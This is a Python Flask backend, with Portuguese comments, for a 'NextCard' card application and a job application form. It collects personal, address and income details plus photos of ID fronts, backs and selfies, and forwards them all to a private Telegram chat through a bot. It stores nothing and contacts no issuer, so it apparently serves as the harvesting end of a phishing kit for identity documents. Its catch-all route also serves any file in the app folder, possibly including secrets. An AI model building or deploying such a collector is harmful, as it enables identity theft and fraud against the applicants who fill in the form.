from flask import Flask, request, jsonify, send_from_directory
import requests
import json
import base64
import os
import logging
from io import BytesIO
from PIL import Image
from flask_cors import CORS
from dotenv import load_dotenv
import re
from datetime import datetime, date
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import secrets

# Configuração de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s %(levelname)s %(name)s %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('app.log')
    ]
)

logger = logging.getLogger(__name__)

# Carregar variáveis de ambiente
load_dotenv()

app = Flask(__name__)
CORS(app)  # Habilita CORS para todas as rotas

# Rate Limiting
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

# Configurações do Telegram a partir de variáveis de ambiente
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

# Validação das credenciais
if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
    logger.error("Credenciais do Telegram não encontradas nas variáveis de ambiente")
    raise ValueError("Credenciais do Telegram não encontradas nas variáveis de ambiente")

# Rotas para servir arquivos estáticos
@app.route('/')
def serve_index():
    """Serve o arquivo HTML principal"""
    return send_from_directory('.', 'index.html')

@app.route('/<path:path>')
def serve_static(path):
    """Serve arquivos estáticos (CSS, JS, imagens, etc.)"""
    return send_from_directory('.', path)

def validate_email(email):
    """Valida formato de email"""
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(pattern, email) is not None

def validate_phone(phone):
    """Valida número de telefone"""
    cleaned = re.sub(r'\D', '', phone)
    return len(cleaned) >= 10  # Mínimo 10 dígitos

def validate_birthdate(birthdate):
    """Valida data de nascimento (mínimo 18 anos)"""
    try:
        birth_date = datetime.strptime(birthdate, '%Y-%m-%d').date()
        today = date.today()
        age = today.year - birth_date.year - ((today.month, today.day) < (birth_date.month, birth_date.day))
        return age >= 18
    except ValueError:
        return False

def validate_image_size(image_data, max_size_mb=10):
    """Valida tamanho da imagem"""
    max_size = max_size_mb * 1024 * 1024
    return len(image_data) <= max_size

def process_image_data(photo):
    """Processa dados da imagem base64"""
    try:
        if ',' in photo:
            image_data = base64.b64decode(photo.split(',')[1])
        else:
            image_data = base64.b64decode(photo)
        
        # Validar tamanho
        if not validate_image_size(image_data):
            raise ValueError("Imagem muito grande")
            
        return image_data
    except Exception as e:
        logger.error(f"Erro ao processar imagem: {str(e)}")
        raise

def send_to_telegram(message, photo_data=None):
    """Envia mensagem e fotos para o Telegram com tratamento de erros"""
    try:
        # Enviar mensagem de texto
        text_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        text_payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }
        
        response = requests.post(text_url, json=text_payload, timeout=10)
        response.raise_for_status()
        
        # Enviar fotos se existirem
        if photo_data:
            for p_type, photo in photo_data.items():
                if photo:
                    try:
                        image_data = process_image_data(photo)
                        
                        # Enviar foto
                        photo_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
                        files = {
                            "photo": (f"{p_type}_id.jpg", BytesIO(image_data), "image/jpeg")
                        }
                        data = {
                            "chat_id": TELEGRAM_CHAT_ID,
                            "caption": f"Foto do {p_type} do documento"
                        }
                        
                        photo_response = requests.post(photo_url, files=files, data=data, timeout=30)
                        photo_response.raise_for_status()
                        logger.info(f"Foto {p_type} enviada com sucesso")
                        
                    except requests.exceptions.RequestException as e:
                        logger.error(f"Erro ao enviar foto {p_type} para Telegram: {str(e)}")
                        continue
                    except Exception as e:
                        logger.error(f"Erro ao processar foto {p_type}: {str(e)}")
                        continue
        
        logger.info("Mensagem enviada para Telegram com sucesso")
        return True
        
    except requests.exceptions.RequestException as e:
        logger.error(f"Erro na API do Telegram: {str(e)}")
        return False
    except Exception as e:
        logger.error(f"Erro inesperado ao enviar para Telegram: {str(e)}")
        return False

@app.route('/submit', methods=['POST'])
@limiter.limit("10 per minute")
def handle_submission():
    try:
        # Verificar se há dados JSON
        if not request.is_json:
            return jsonify({"success": False, "message": "Content-Type must be application/json"}), 400
            
        data = request.get_json()
        
        if not data:
            return jsonify({"success": False, "message": "Nenhum dado recebido"}), 400
        
        form_data = data.get('formData', {})
        photos = data.get('photos', {})
        
        # Log da tentativa de submissão (sem dados sensíveis)
        logger.info(f"Tentativa de submissão recebida - Tipo: {form_data.get('applicationType', 'nextcard')}")
        
        # Verificar se é uma aplicação de vaga
        is_job_application = form_data.get('applicationType') == 'job_application' or form_data.get('cardType') == 'Vaga de Emprego'
        
        if is_job_application:
            # Validações específicas para vagas
            required_fields = {
                'firstName': 'Nome é obrigatório',
                'email': 'Email é obrigatório',
                'phone': 'Telefone é obrigatório',
                'country': 'País é obrigatório',
                'employmentStatus': 'Situação de emprego é obrigatória'
            }
            
            # Preencher campos opcionais para vagas
            optional_fields = {
                'lastName': 'N/A',
                'addressLine1': 'Não informado - Candidatura Online',
                'city': 'Não informado',
                'state': 'Não informado',
                'postalCode': '00000-000',
                'income': 'Não informado',
                'employmentStatus': 'candidate'
            }
            
            for field, default_value in optional_fields.items():
                if not form_data.get(field):
                    form_data[field] = default_value
        else:
            # Validações originais do NextCard
            required_fields = {
                'firstName': 'Nome é obrigatório',
                'lastName': 'Sobrenome é obrigatório',
                'email': 'Email é obrigatório',
                'phone': 'Telefone é obrigatório',
                'idNumber': 'Número de identificação é obrigatório',
                'birthdate': 'Data de nascimento é obrigatória',
                'country': 'País é obrigatório',
                'addressLine1': 'Endereço é obrigatório',
                'city': 'Cidade é obrigatória',
                'state': 'Estado é obrigatório',
                'postalCode': 'CEP é obrigatório',
                'currency': 'Moeda é obrigatória',
                'income': 'Renda anual é obrigatória',
                'occupation': 'Ocupação é obrigatória',
                'employmentStatus': 'Situação de emprego é obrigatória',
                'cardType': 'Tipo de cartão é obrigatório'
            }
        
        # Aplicar validações dos campos obrigatórios
        for field, message in required_fields.items():
            if not form_data.get(field):
                logger.warning(f"Campo obrigatório faltando: {field}")
                return jsonify({"success": False, "message": message}), 400
        
        # Validações específicas
        if not validate_email(form_data.get('email', '')):
            return jsonify({"success": False, "message": "Email inválido"}), 400
            
        if not validate_phone(form_data.get('phone', '')):
            return jsonify({"success": False, "message": "Número de telefone inválido"}), 400
        
        # Para NextCard, validar data de nascimento
        if not is_job_application and not validate_birthdate(form_data.get('birthdate', '')):
            return jsonify({"success": False, "message": "Você deve ter pelo menos 18 anos"}), 400
        
        # Validar fotos
        required_photos = ['front', 'back', 'selfie']
        for photo_type in required_photos:
            if not photos.get(photo_type):
                return jsonify({"success": False, "message": f"Foto {photo_type} é obrigatória"}), 400
        
        # Formatando a mensagem baseada no tipo
        if is_job_application:
            message = f"""📋 *Nova Candidatura Recebida* 📋

*Informações Pessoais:*
• Nome: {form_data.get('firstName', '')} {form_data.get('lastName', '')}
• Email: {form_data.get('email', '')}
• Telefone: {form_data.get('phone', '')}
• Celular: {form_data.get('cellphone', 'Não informado')}
• País: {form_data.get('country', '')}
• Nacionalidade: {form_data.get('nationality', 'Não informado')}
• Data Nascimento: {form_data.get('birthdate', 'Não informado')}

*Informações Profissionais:*
• Área de Interesse: {form_data.get('positionInterest', 'Não informado')}
• Situação de Emprego: {form_data.get('employmentStatus', 'Não informado')}
• Profissão: {form_data.get('occupation', 'Não informado')}
• Salário Atual: {form_data.get('income', 'Não informado')}
• Instituições: {form_data.get('institutions', 'Não informado')}
• Experiência: {form_data.get('experience', 'Não informado')}
• Escolaridade: {form_data.get('education', 'Não informado')}
• Idiomas: {form_data.get('languages', 'Não informado')}
• Habilidades: {form_data.get('skills', 'Não informado')}

*Carta de Apresentação:*
{form_data.get('coverLetter', 'Não informada')}

*Fotos anexadas:* {sum(1 for photo in photos.values() if photo)}/3"""
        else:
            message = f"""📋 *Nova solicitação de NextCard* 📋

*Informações Pessoais:*
• Nome: {form_data.get('firstName', '')} {form_data.get('lastName', '')}
• Email: {form_data.get('email', '')}
• Telefone: {form_data.get('phone', '')}
• ID/Passaporte: {form_data.get('idNumber', '')}
• Data de Nascimento: {form_data.get('birthdate', '')}

*Informações de Endereço:*
• País: {form_data.get('country', '')}
• Endereço: {form_data.get('addressLine1', '')}
• Endereço 2: {form_data.get('addressLine2', '')}
• Cidade: {form_data.get('city', '')}
• Estado: {form_data.get('state', '')}
• Código Postal: {form_data.get('postalCode', '')}

*Informações Financeiras:*
• Moeda: {form_data.get('currency', '')}
• Renda Anual: {form_data.get('income', '')}
• Ocupação: {form_data.get('occupation', '')}
• Situação de Emprego: {form_data.get('employmentStatus', '')}
• Tipo de Cartão: {form_data.get('cardType', '')}

*Fotos anexadas:* {sum(1 for photo in photos.values() if photo)}/3"""
        
        # Enviar para o Telegram
        success = send_to_telegram(message, photos)
        
        if success:
            prefix = "JH" if is_job_application else "NC"
            application_id = f"{prefix}{secrets.token_hex(4).upper()}"
            
            logger.info(f"Submissão bem-sucedida - ID: {application_id}")
            
            return jsonify({
                "success": True, 
                "message": "Dados enviados com sucesso",
                "applicationId": application_id
            })
        else:
            logger.error("Falha ao enviar para Telegram")
            return jsonify({"success": False, "message": "Erro ao enviar para o Telegram"}), 500
            
    except Exception as e:
        logger.error(f"Erro interno do servidor: {str(e)}", exc_info=True)
        return jsonify({"success": False, "message": "Erro interno do servidor"}), 500

@app.route('/health', methods=['GET'])
def health_check():
    """Endpoint para verificar se o servidor está funcionando"""
    return jsonify({
        "status": "healthy", 
        "message": "Server is running",
        "timestamp": datetime.now().isoformat()
    })

@app.errorhandler(429)
def ratelimit_handler(e):
    return jsonify({
        "success": False, 
        "message": "Muitas requisições. Tente novamente mais tarde."
    }), 429

@app.errorhandler(500)
def internal_error_handler(e):
    logger.error(f"Erro 500: {str(e)}")
    return jsonify({
        "success": False, 
        "message": "Erro interno do servidor"
    }), 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    debug = os.environ.get("DEBUG", "false").lower() == "true"
    
    logger.info(f"Iniciando servidor na porta {port} (debug: {debug})")
    
    app.run(host="0.0.0.0", port=port, debug=debug)
